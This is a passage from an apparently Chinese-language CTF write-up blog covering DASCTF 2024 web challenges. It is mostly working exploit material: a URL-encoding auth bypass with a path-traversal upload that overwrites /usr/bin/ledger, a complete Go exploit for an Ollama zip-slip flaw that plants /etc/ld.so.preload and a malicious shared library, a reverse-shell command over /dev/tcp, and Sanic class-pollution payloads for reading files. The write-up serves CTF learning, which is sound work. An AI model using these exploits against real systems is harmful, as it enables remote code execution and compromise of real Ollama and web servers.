class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&quot;xxxxxxxx&quot;</span></span><br><span class="line">    exp(url)</span><br></pre></td></tr></table></figure><p>这里其实就是多了一步先将本地生成好的恶意数据库写入到服务器，然后在修改php文件中的sqlite数据库的路径从而达到在连接的时候触发_set魔术方法。</p><h3 id="DASCTF2024-金秋十月赛">DASCTF2024 金秋十月赛</h3><h4 id="paisa4shell">paisa4shell</h4><img src="/post/639d78a4/IMAGE20250228140011658.png" class=""><p>这里用了 c.Request.RequestURI 来确定路由，但是 c.Request.RequestURI 是原始的请求URI，gin框架的路由选择是根据 c.Request.URL.Path 来确定的，所以我们可以通过URL编码的方式绕过这个中间件的检测，就像这样</p><img src="/post/639d78a4/IMAGE20250228140207721.png" class=""><p>绕过身份验证后，可以利用 <code>/api/editor/validate</code> 的任意文件上传漏洞覆盖 /usr/bin/ledger 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /%61pi/sheets/save HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:7500</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 60</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;../../../usr/bin/ledger&quot;,&quot;content&quot;:&quot;#!/bin/sh\nid&quot;&#125;</span><br></pre></td></tr></table></figure><img src="/post/639d78a4/IMAGE20250228140357161.png" class=""><p>最后使用 <code>/api/editor/validate</code> 触发执行命令</p><img src="/post/639d78a4/IMAGE20250228140428630.png" class=""><h4 id="ollama4shell">ollama4shell</h4><p>参考：官方wp</p><p>题目所给的ollama版本有个zip slip漏洞<a href="https://github.com/advisories/GHSA-846m-99qv-67mg">https://github.com/advisories/GHSA-846m-99qv-67mg</a></p><p>思路就是通过zip slip上传 ld.so.preload 到 <code>/etc/ld.so.preload</code> 用于加载恶意so，之后随便在官方模型站pull一个比较小的模型，最后再使用 <code>/api/embeddings</code> 接口加载这个模型，加载模型时会调用 <code>ollama</code> 命令开启一个新进程从而加载恶意so执行任意命令。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">需要在linux下运行，环境需要有gcc</span><br><span class="line">安装golang，执行如下命令反弹shell</span><br><span class="line"><span class="keyword">go</span> run main.<span class="keyword">go</span> -target http:<span class="comment">//127.0.0.1:11434/ -exec &quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xxxx 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;archive/zip&quot;</span></span><br><span class="line">    <span class="string">&quot;bufio&quot;</span></span><br><span class="line">    <span class="string">&quot;bytes&quot;</span></span><br><span class="line">    <span class="string">&quot;crypto/sha256&quot;</span></span><br><span class="line">    <span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">    <span class="string">&quot;flag&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;io&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;net/url&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">    <span class="string">&quot;os/exec&quot;</span></span><br><span class="line">    <span class="string">&quot;strconv&quot;</span></span><br><span class="line">    <span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> CODE = <span class="string">`#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">void __attribute__((constructor)) myInitFunction() &#123;</span></span><br><span class="line"><span class="string">    const char *f1 = &quot;/etc/ld.so.preload&quot;;</span></span><br><span class="line"><span class="string">    const char *f2 = &quot;/tmp/hook.so&quot;;</span></span><br><span class="line"><span class="string">    unlink(f1);</span></span><br><span class="line"><span class="string">    unlink(f2);</span></span><br><span class="line"><span class="string">    system(&quot;bash -c &#x27;%s&#x27;&quot;);</span></span><br><span class="line"><span class="string">&#125;`</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> targetUrl <span class="type">string</span></span><br><span class="line">    <span class="keyword">var</span> execCmd <span class="type">string</span></span><br><span class="line">    flag.StringVar(&amp;targetUrl, <span class="string">&quot;target&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;target url&quot;</span>)</span><br><span class="line">    flag.StringVar(&amp;execCmd, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;exec command&quot;</span>)</span><br><span class="line">    flag.Parse()</span><br><span class="line">    <span class="keyword">if</span> targetUrl == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;target url is required&quot;</span>)</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    u := FormatUrl(targetUrl)</span><br><span class="line"></span><br><span class="line">    detectRes, err := Detect(u)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> !detectRes &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;\nVulnerability does not exist&quot;</span>)</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;\nVulnerability does exist!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> execCmd == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;exec command is required&quot;</span>)</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _, err = GenEvilSo(execCmd)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    evilZipName, err := GenEvilZip()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    blobSha256Name, err := UploadBlob(u, evilZipName)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    err = Create(u, strings.ReplaceAll(blobSha256Name, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;-&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    err = EmbeddingsExec(u, <span class="string">&quot;all-minilm:22m&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GenEvilSo</span><span class="params">(cmd <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    code := fmt.Sprintf(CODE, cmd)</span><br><span class="line">    err := os.WriteFile(<span class="string">&quot;tmp.c&quot;</span>, []<span class="type">byte</span>(code), <span class="number">0644</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    compile := exec.Command(<span class="string">&quot;gcc&quot;</span>, <span class="string">&quot;tmp.c&quot;</span>, <span class="string">&quot;-o&quot;</span>, <span class="string">&quot;hook.so&quot;</span>, <span class="string">&quot;-fPIC&quot;</span>, <span class="string">&quot;-shared&quot;</span>, <span class="string">&quot;-ldl&quot;</span>, <span class="string">&quot;-D_GNU_SOURCE&quot;</span>)</span><br><span class="line">    err = compile.Run()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hook.so&quot;</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GenEvilZip</span><span class="params">()</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    zipFile, err := os.Create(<span class="string">&quot;evil.zip&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    zw := zip.NewWriter(zipFile)</span><br><span class="line"></span><br><span class="line">    preloadFile, err := zw.Create(<span class="string">&quot;../../../../../../../../../../etc/ld.so.preload&quot;</span>)</span><br><span class="line">    _, err = preloadFile.Write([]<span class="type">byte</span>(<span class="string">&quot;/tmp/hook.so&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    soFile, err := zw.Create(<span class="string">&quot;../../../../../../../../../../tmp/hook.so&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    locSoFile, err := os.Open(<span class="string">&quot;hook.so&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> locSoFile.Close()</span><br><span class="line">    io.Copy(soFile, locSoFile)</span><br><span class="line"></span><br><span class="line">    zw.Close()</span><br><span class="line">    zipFile.Close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;evil.zip&quot;</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UploadBlob</span><span class="params">(url, fileName <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    f, err := os.Open(fileName)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> f.Close()</span><br><span class="line">    h := sha256.New()</span><br><span class="line">    <span class="keyword">if</span> _, err := io.Copy(h, f); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    fName := fmt.Sprintf(<span class="string">&quot;sha256:%x&quot;</span>, h.Sum(<span class="literal">nil</span>))</span><br><span class="line"></span><br><span class="line">    _, err = f.Seek(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    newReader := bufio.NewReader(f)</span><br><span class="line"></span><br><span class="line">    res, err := http.Post(url+<span class="string">&quot;/api/blobs/&quot;</span>+fName, <span class="string">&quot;application/octet-stream&quot;</span>, newReader)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    content, err := io.ReadAll(res.Body)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;http log: &quot;</span> + <span class="type">string</span>(content))</span><br><span class="line">    <span class="keyword">return</span> fName, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Create</span><span class="params">(url, remoteFilePath <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">    jsonContent := []<span class="type">byte</span>(fmt.Sprintf(<span class="string">`&#123;&quot;name&quot;: &quot;test&quot;,&quot;modelfile&quot;: &quot;FROM /root/.ollama/models/blobs/%s&quot;&#125;`</span>, remoteFilePath))</span><br><span class="line"></span><br><span class="line">    res, err := http.Post(url+<span class="string">&quot;/api/create&quot;</span>, <span class="string">&quot;application/json&quot;</span>, bytes.NewBuffer(jsonContent))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    content, err := io.ReadAll(res.Body)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;http log: &quot;</span> + <span class="type">string</span>(content))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">EmbeddingsExec</span><span class="params">(url, model <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">        jsonContent := []<span class="type">byte</span>(fmt.Sprintf(<span class="string">`&#123;&quot;model&quot;:&quot;%s&quot;,&quot;keep_alive&quot;: 0&#125;`</span>, model))</span><br><span class="line">        res, err := http.Post(url+<span class="string">&quot;/api/embeddings&quot;</span>, <span class="string">&quot;application/json&quot;</span>, bytes.NewBuffer(jsonContent))</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> res.StatusCode != <span class="number">200</span> &#123;</span><br><span class="line">            fmt.Println(<span class="string">&quot;pulling model, please wait......&quot;</span>)</span><br><span class="line">            err := PullMinilmModel(url)</span><br><span class="line">            <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> err</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            content, err := io.ReadAll(res.Body)</span><br><span class="line">            <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> err</span><br><span class="line">            &#125;</span><br><span class="line">            fmt.Println(<span class="string">&quot;http log: &quot;</span> + <span class="type">string</span>(content))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PullMinilmModel</span><span class="params">(url <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">    jsonContent := <span class="string">`&#123;&quot;name&quot;:&quot;all-minilm:22m&quot;&#125;`</span></span><br><span class="line">    res, err := http.Post(url+<span class="string">&quot;/api/pull&quot;</span>, <span class="string">&quot;application/json&quot;</span>, bytes.NewBuffer([]<span class="type">byte</span>(jsonContent)))</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    content, err := io.ReadAll(res.Body)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;http log: &quot;</span> + <span class="type">string</span>(content))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Detect</span><span class="params">(url <span class="type">string</span>)</span></span> (<span class="type">bool</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    res, err := http.Get(url + <span class="string">&quot;/api/version&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> jsonMap <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span></span><br><span class="line">    jsonContent, err := io.ReadAll(res.Body)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> err := json.Unmarshal(jsonContent, &amp;jsonMap); err != <span class="literal">nil</span> || jsonMap[<span class="string">&quot;version&quot;</span>] == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> isVersionLessThan(jsonMap[<span class="string">&quot;version&quot;</span>], <span class="string">&quot;0.1.47&quot;</span>), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">FormatUrl</span><span class="params">(u <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    ur, err := url.Parse(u)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(ur)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%s://%s&quot;</span>, ur.Scheme, ur.Host)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isVersionLessThan</span><span class="params">(version, target <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">    v1 := strings.Split(version, <span class="string">&quot;.&quot;</span>)</span><br><span class="line">    v2 := strings.Split(target, <span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(v1) &amp;&amp; i &lt; <span class="built_in">len</span>(v2); i++ &#123;</span><br><span class="line">        num1, _ := strconv.Atoi(v1[i])</span><br><span class="line">        num2, _ := strconv.Atoi(v2[i])</span><br><span class="line">        <span class="keyword">if</span> num1 &lt; num2 &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> num1 &gt; num2 &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(v1) &lt; <span class="built_in">len</span>(v2)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="flow">flow</h4><p>直接读 /proc/1/environ</p><h3 id="DASCTF-2024暑期挑战赛｜为热爱，并肩作战">DASCTF 2024暑期挑战赛｜为热爱，并肩作战</h3><h4 id="Sanic’s-revenge">Sanic’s revenge</h4><p>这题在看之前先参考一篇师傅的文章作为前置内容学习<br><a href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p><p>这里是用到了ciscn2024 sanic的一个知识点先来看这个题的源码，学习一波知识点。</p><p>具体就是file_or_directory这个属性可以被污染，污染了以后可以通过路由直接访问到文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span>,<span class="string">&quot;value&quot;</span>: <span class="string">&quot;/&quot;</span>&#125;</span><br></pre></td></tr></table></figure><img src="/post/639d78a4/IMAGE20250228190617679.png" class=""><p>可以直接访问文件。还要在参考一篇文章,分环境有点抽象，具体原理看这个师傅的文章<br><a href="https://www.cnblogs.com/gxngxngxn/p/18290489">https://www.cnblogs.com/gxngxngxn/p/18290489</a></p><p>记录下他的payload就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#开启列目录</span></span><br><span class="line">data =&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span>,<span class="string">&quot;value&quot;</span>: <span class="literal">True</span>&#125;</span><br><span class="line"><span class="comment">#将目录设置在根目录下</span></span><br><span class="line"><span class="comment">#data = &#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;,&quot;value&quot;: &quot;/&quot;&#125;</span></span><br><span class="line"><span class="comment">#修改默认路径</span></span><br><span class="line">data=&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span>,<span class="string">&quot;value&quot;</span>: <span class="string">&quot;/&quot;</span>&#125;</span><br><span class="line"><span class="comment">#构造current</span></span><br><span class="line"><span class="comment">#data = &#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.base&quot;,&quot;value&quot;: &quot;static/fJBkhI&quot;&#125;</span></span><br><span class="line"></span><br><span class="line">response = requests.post(url=<span class="string">&#x27;url/pollute&#x27;</span>, json=data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
